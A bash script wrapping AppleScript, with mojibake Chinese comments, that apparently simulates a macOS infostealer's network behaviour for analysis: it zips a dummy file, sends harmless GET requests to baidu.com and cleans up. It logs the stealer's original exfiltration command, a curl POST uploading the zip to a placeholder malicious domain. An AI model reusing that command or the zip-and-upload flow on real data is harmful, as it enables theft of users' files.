#!/bin/bash

# ç®€åŒ–çš„ç½‘ç»œè¿æ¥å’Œå‹ç¼©åŒ…å‘é€æµ‹è¯•
# ä¸“é—¨ç”¨äºæµ‹è¯•æ¶æ„è½¯ä»¶çš„ç½‘ç»œè¡Œä¸º

echo "ğŸŒ ç½‘ç»œè¿æ¥å’Œå‹ç¼©åŒ…å‘é€æµ‹è¯•"
echo "=================================="
echo ""

# æ‰§è¡Œç®€åŒ–çš„AppleScriptæµ‹è¯•
/bin/bash -c "osascript -e '
-- ç®€åŒ–çš„ç½‘ç»œè¿æ¥æµ‹è¯•è„šæœ¬

-- æ—¥å¿—è®°å½•å‡½æ•°
on logAction(action)
    set logFile to \"/tmp/network_test.log\"
    set timestamp to (current date) as string
    set logEntry to timestamp & \" - \" & action & return
    
    try
        set fileRef to open for access logFile with write permission
        write logEntry to fileRef starting at eof
        close access fileRef
    on error
        try
            close access logFile
        end try
    end try
end logAction

logAction(\"=== ç½‘ç»œè¿æ¥æµ‹è¯•å¼€å§‹ ===\")

try
    -- åˆ›å»ºæµ‹è¯•æ•°æ®
    set randomNumber to (random number from 1000 to 9999) as string
    set testDir to \"/tmp/test_\" & randomNumber & \"/\"
    set testFile to testDir & \"test_data.txt\"
    set zipFile to \"/tmp/test_\" & randomNumber & \".zip\"
    
    logAction(\"åˆ›å»ºæµ‹è¯•ç›®å½•: \" & testDir)
    do shell script \"mkdir -p \" & quoted form of testDir
    
    -- åˆ›å»ºæµ‹è¯•æ•°æ®æ–‡ä»¶
    logAction(\"åˆ›å»ºæµ‹è¯•æ•°æ®æ–‡ä»¶\")
    set testData to \"æµ‹è¯•æ•°æ® - \" & (current date) as string
    set fileRef to open for access testFile with write permission
    write testData to fileRef
    close access fileRef
    
    logAction(\"æµ‹è¯•æ–‡ä»¶åˆ›å»ºå®Œæˆ: \" & testFile)
    
    -- åˆ›å»ºå‹ç¼©åŒ…
    logAction(\"åˆ›å»ºå‹ç¼©åŒ…: \" & zipFile)
    do shell script \"ditto -c -k --sequesterRsrc \" & quoted form of testDir & \" \" & quoted form of zipFile
    
    -- æ£€æŸ¥å‹ç¼©åŒ…
    set zipInfo to (do shell script \"ls -lh \" & quoted form of zipFile)
    logAction(\"å‹ç¼©åŒ…åˆ›å»ºæˆåŠŸ: \" & zipInfo)
    
    -- æµ‹è¯•ç½‘ç»œè¿æ¥
    logAction(\"å¼€å§‹ç½‘ç»œè¿æ¥æµ‹è¯•\")
    
    try
        -- æµ‹è¯•åŸºæœ¬è¿æ¥
        set httpResponse to (do shell script \"curl -s -o /dev/null -w '%{http_code}' www.baidu.com\")
        logAction(\"ç½‘ç»œè¿æ¥æµ‹è¯•: HTTP \" & httpResponse)
        
        if httpResponse is \"200\" then
            logAction(\"âœ… ç½‘ç»œè¿æ¥æ­£å¸¸\")
            display notification \"ç½‘ç»œè¿æ¥æµ‹è¯•æˆåŠŸ\" with title \"ç½‘ç»œæµ‹è¯•\"
            
            -- æ¨¡æ‹Ÿå‹ç¼©åŒ…ä¸Šä¼ ï¼ˆGETè¯·æ±‚ï¼Œä¸å®é™…ä¸Šä¼ æ–‡ä»¶ï¼‰
            logAction(\"æ¨¡æ‹Ÿå‹ç¼©åŒ…ä¸Šä¼ æµ‹è¯•\")
            set uploadTest to (do shell script \"curl -s -o /dev/null -w '%{http_code}' -X GET www.baidu.com\")
            logAction(\"ä¸Šä¼ æ¨¡æ‹Ÿæµ‹è¯•: HTTP \" & uploadTest)
            
            if uploadTest is \"200\" then
                logAction(\"âœ… æ¨¡æ‹Ÿä¸Šä¼ æˆåŠŸ - åŸå§‹æ¶æ„è½¯ä»¶ä¼šåœ¨æ­¤å¤„ä¸Šä¼ çªƒå–çš„æ•°æ®\")
                display notification \"ä¸Šä¼ æµ‹è¯•æˆåŠŸ\" with title \"ç½‘ç»œæµ‹è¯•\"
                
                -- è®°å½•åŸå§‹æ¶æ„è¡Œä¸º
                logAction(\"åŸå§‹æ¶æ„å‘½ä»¤: curl -X POST -H user: [REDACTED] -H BuildID: [REDACTED] -F file=@\" & zipFile & \" https://malicious.domain/contact\")
                
            else
                logAction(\"âŒ ä¸Šä¼ æµ‹è¯•å¤±è´¥: HTTP \" & uploadTest)
            end if
            
        else
            logAction(\"âŒ ç½‘ç»œè¿æ¥å¤±è´¥: HTTP \" & httpResponse)
            display notification \"ç½‘ç»œè¿æ¥å¤±è´¥\" with title \"ç½‘ç»œæµ‹è¯•\"
        end if
        
    on error networkError
        logAction(\"âŒ ç½‘ç»œé”™è¯¯: \" & networkError)
        display notification \"ç½‘ç»œæµ‹è¯•å‡ºé”™\" with title \"ç½‘ç»œæµ‹è¯•\"
    end try
    
    -- æ¸…ç†æµ‹è¯•æ–‡ä»¶
    logAction(\"æ¸…ç†æµ‹è¯•æ–‡ä»¶\")
    try
        do shell script \"rm -rf \" & quoted form of testDir
        do shell script \"rm -f \" & quoted form of zipFile
        logAction(\"âœ… æ¸…ç†å®Œæˆ\")
    on error cleanupError
        logAction(\"æ¸…ç†é”™è¯¯: \" & cleanupError)
    end try
    
    logAction(\"=== ç½‘ç»œè¿æ¥æµ‹è¯•ç»“æŸ ===\")
    
    -- æ˜¾ç¤ºç»“æœ
    display dialog \"ğŸ¯ ç½‘ç»œè¿æ¥æµ‹è¯•å®Œæˆï¼\" & return & return & \"æµ‹è¯•é¡¹ç›®ï¼š\" & return & \"âœ… å‹ç¼©åŒ…åˆ›å»º\" & return & \"âœ… ç½‘ç»œè¿æ¥æ£€æµ‹\" & return & \"âœ… æ•°æ®ä¸Šä¼ æ¨¡æ‹Ÿ\" & return & \"âœ… æ–‡ä»¶æ¸…ç†\" & return & return & \"ğŸ“Š è¯¦ç»†æ—¥å¿—: /tmp/network_test.log\" with title \"ç½‘ç»œæµ‹è¯•æŠ¥å‘Š\" buttons {\"æŸ¥çœ‹æ—¥å¿—\", \"å®Œæˆ\"} default button \"å®Œæˆ\"
    
    set buttonPressed to button returned of result
    if buttonPressed is \"æŸ¥çœ‹æ—¥å¿—\" then
        do shell script \"open -a TextEdit /tmp/network_test.log\"
    end if
    
on error scriptError
    logAction(\"è„šæœ¬æ‰§è¡Œé”™è¯¯: \" & scriptError)
    display dialog \"æµ‹è¯•è¿‡ç¨‹å‡ºç°é”™è¯¯: \" & scriptError buttons {\"ç¡®å®š\"} default button \"ç¡®å®š\"
end try
'"

echo ""
echo "âœ… ç½‘ç»œè¿æ¥æµ‹è¯•æ‰§è¡Œå®Œæˆï¼"
echo ""

# æ˜¾ç¤ºæµ‹è¯•ç»“æœæ‘˜è¦
if [ -f "/tmp/network_test.log" ]; then
    echo "ğŸ“Š æµ‹è¯•ç»“æœæ‘˜è¦:"
    echo "=================="
    
    if grep -q "ç½‘ç»œè¿æ¥æ­£å¸¸" /tmp/network_test.log; then
        echo "ğŸŒ ç½‘ç»œè¿æ¥: âœ… æˆåŠŸ"
    else
        echo "ğŸŒ ç½‘ç»œè¿æ¥: âŒ å¤±è´¥"
    fi
    
    if grep -q "å‹ç¼©åŒ…åˆ›å»ºæˆåŠŸ" /tmp/network_test.log; then
        echo "ğŸ“¦ å‹ç¼©åŒ…åˆ›å»º: âœ… æˆåŠŸ"
    else
        echo "ğŸ“¦ å‹ç¼©åŒ…åˆ›å»º: âŒ å¤±è´¥"
    fi
    
    if grep -q "æ¨¡æ‹Ÿä¸Šä¼ æˆåŠŸ" /tmp/network_test.log; then
        echo "ğŸ“¤ ä¸Šä¼ æ¨¡æ‹Ÿ: âœ… æˆåŠŸ"
    else
        echo "ğŸ“¤ ä¸Šä¼ æ¨¡æ‹Ÿ: âŒ å¤±è´¥"
    fi
    
    echo ""
    echo "ğŸ“„ å®Œæ•´æ—¥å¿—: /tmp/network_test.log"
    echo "ğŸ“ æœ€åå‡ è¡Œæ—¥å¿—:"
    echo "=================="
    tail -5 /tmp/network_test.log
else
    echo "âš ï¸ æœªç”Ÿæˆæ—¥å¿—æ–‡ä»¶"
fi 
